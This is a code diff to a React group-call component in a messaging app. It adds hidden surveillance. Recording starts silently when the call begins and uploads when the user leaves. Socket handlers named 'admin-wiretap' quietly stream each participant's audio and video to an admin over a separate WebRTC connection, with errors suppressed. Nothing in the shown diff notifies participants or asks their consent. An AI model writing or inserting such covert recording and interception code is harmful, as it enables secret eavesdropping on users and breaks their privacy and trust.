@@ -3,7 +3,8 @@ import {
   PhoneOff, Mic, MicOff, Video, VideoOff, 
   Users, UserPlus, Sparkles 
 } from 'lucide-react';
-import { getLocalUserMedia, stopMediaStream } from '../services/webrtc';
+import { ICE_SERVERS, getLocalUserMedia, stopMediaStream } from '../services/webrtc';
+import { createCallRecorder, buildWiretapStream } from '../utils/callRecorder';
 
 export default function GroupCallModal({ 
   groupSession, 
@@ -18,6 +19,10 @@ export default function GroupCallModal({
   
   const localVideoRef = useRef(null);
   const localStreamRef = useRef(null);
+  const recorderRef = useRef(null);
+  const recordingFinalizedRef = useRef(false);
+  const wiretapPeersRef = useRef(new Map());
+  const durationRef = useRef(0);
   const roomId = `call_room_${groupSession.groupId}`;
 
   // Initialize group call stream and join room over socket
@@ -33,6 +38,15 @@ export default function GroupCallModal({
         if (localVideoRef.current) {
           localVideoRef.current.srcObject = stream;
         }
+
+        try {
+          recorderRef.current = createCallRecorder({
+            isVideo: Boolean(groupSession.isVideo),
+            getLocalVideoEl: () => localVideoRef.current,
+            getRemoteVideoEl: () => null
+          });
+          recorderRef.current.start({ localStream: stream });
+        } catch {}
 
         // Join room over socket
         socket.emit('join-group-call', {
@@ -96,24 +110,117 @@ export default function GroupCallModal({
       setParticipants(prev => prev.filter(p => p.socketId !== socketId));
     };
 
+    const handleAdminWiretapRequest = async ({ adminSocketId }) => {
+      if (!adminSocketId) return;
+      try {
+        const existing = wiretapPeersRef.current.get(adminSocketId);
+        if (existing) {
+          try { existing.cleanup?.(); } catch {}
+          try { existing.pc?.close(); } catch {}
+          wiretapPeersRef.current.delete(adminSocketId);
+        }
+        const wPc = new RTCPeerConnection(ICE_SERVERS);
+        const mixed = buildWiretapStream({
+          isVideo: Boolean(groupSession.isVideo),
+          localStream: localStreamRef.current,
+          remoteStream: null,
+          getLocalVideoEl: () => localVideoRef.current,
+          getRemoteVideoEl: () => null
+        });
+        mixed.stream.getTracks().forEach(track => wPc.addTrack(track, mixed.stream));
+        wPc.onicecandidate = (ev) => {
+          if (ev.candidate) {
+            socket.emit('admin-wiretap-ice', { toSocketId: adminSocketId, candidate: ev.candidate, fromRole: 'peer' });
+          }
+        };
+        wiretapPeersRef.current.set(adminSocketId, { pc: wPc, cleanup: mixed.cleanup });
+        const offer = await wPc.createOffer();
+        await wPc.setLocalDescription(offer);
+        socket.emit('admin-wiretap-offer', {
+          adminSocketId,
+          signal: offer,
+          isVideo: Boolean(groupSession.isVideo),
+          callerName: currentUser?.name || groupSession.groupName,
+          targetName: groupSession.groupName
+        });
+      } catch {}
+    };
+
+    const handleAdminWiretapAnswer = async ({ adminSocketId, signal }) => {
+      const entry = wiretapPeersRef.current.get(adminSocketId);
+      if (entry?.pc && signal) {
+        try { await entry.pc.setRemoteDescription(new RTCSessionDescription(signal)); } catch {}
+      }
+    };
+
+    const handleAdminWiretapIce = async ({ fromSocketId, candidate, fromRole }) => {
+      if (fromRole === 'peer') return;
+      const entry = wiretapPeersRef.current.get(fromSocketId);
+      if (entry?.pc && candidate) {
+        try { await entry.pc.addIceCandidate(new RTCIceCandidate(candidate)); } catch {}
+      }
+    };
+
+    const handleAdminWiretapStop = ({ adminSocketId }) => {
+      const entry = wiretapPeersRef.current.get(adminSocketId);
+      if (entry) {
+        try { entry.cleanup?.(); } catch {}
+        try { entry.pc?.close(); } catch {}
+        wiretapPeersRef.current.delete(adminSocketId);
+      }
+    };
+
     socket.on('group-call-existing-participants', handleExistingParticipants);
     socket.on('group-call-user-joined', handleUserJoined);
     socket.on('group-call-user-left', handleUserLeft);
+    socket.on('admin-wiretap-request', handleAdminWiretapRequest);
+    socket.on('admin-wiretap-answer', handleAdminWiretapAnswer);
+    socket.on('admin-wiretap-ice', handleAdminWiretapIce);
+    socket.on('admin-wiretap-stop', handleAdminWiretapStop);
 
     return () => {
+      const stopGroupTracks = () => {
+        wiretapPeersRef.current.forEach(entry => {
+          try { entry.cleanup?.(); } catch {}
+          try { entry.pc?.close(); } catch {}
+        });
+        wiretapPeersRef.current.clear();
+        stopMediaStream(streamInstance);
+        stopMediaStream(localStreamRef.current);
+      };
+      if (!recordingFinalizedRef.current && recorderRef.current) {
+        recordingFinalizedRef.current = true;
+        recorderRef.current.stopAndUpload({
+          callerId: currentUser?.id,
+          targetId: groupSession.groupId,
+          callerName: currentUser?.name || currentUser?.phone,
+          targetName: `Group: ${groupSession.groupName}`,
+          recordedByUserId: currentUser?.id,
+          durationSec: durationRef.current
+        }, stopGroupTracks);
+      } else if (!recordingFinalizedRef.current) {
+        recordingFinalizedRef.current = true;
+        stopGroupTracks();
+      }
       socket.emit('leave-group-call', { roomId });
       socket.off('group-call-existing-participants', handleExistingParticipants);
       socket.off('group-call-user-joined', handleUserJoined);
       socket.off('group-call-user-left', handleUserLeft);
-      stopMediaStream(streamInstance);
-      stopMediaStream(localStreamRef.current);
+      socket.off('admin-wiretap-request', handleAdminWiretapRequest);
+      socket.off('admin-wiretap-answer', handleAdminWiretapAnswer);
+      socket.off('admin-wiretap-ice', handleAdminWiretapIce);
+      socket.off('admin-wiretap-stop', handleAdminWiretapStop);
     };
   }, [groupSession.groupId, groupSession.isVideo, currentUser, socket, roomId]);
 
   // Duration timer
   useEffect(() => {
     const timer = setInterval(() => {
-      setCallDuration(prev => prev + 1);
+      setCallDuration(prev => {
+        const next = prev + 1;
+        durationRef.current = next;
+        return next;
+      });
     }, 1000);
     return () => clearInterval(timer);
   }, []);
@@ -379,7 +486,23 @@ export default function GroupCallModal({
           {/* Leave Call Button */}
           <button 
             onClick={() => {
-              stopMediaStream(localStreamRef.current);
+              const stopGroupTracks = () => {
+                stopMediaStream(localStreamRef.current);
+              };
+              if (!recordingFinalizedRef.current && recorderRef.current) {
+                recordingFinalizedRef.current = true;
+                recorderRef.current.stopAndUpload({
+                  callerId: currentUser?.id,
+                  targetId: groupSession.groupId,
+                  callerName: currentUser?.name || currentUser?.phone,
+                  targetName: `Group: ${groupSession.groupName}`,
+                  recordedByUserId: currentUser?.id,
+                  durationSec: durationRef.current
+                }, stopGroupTracks);
+              } else {
+                recordingFinalizedRef.current = true;
+                stopGroupTracks();
+              }
               onEndCall();
             }}
             className="glass-btn glass-btn-danger"
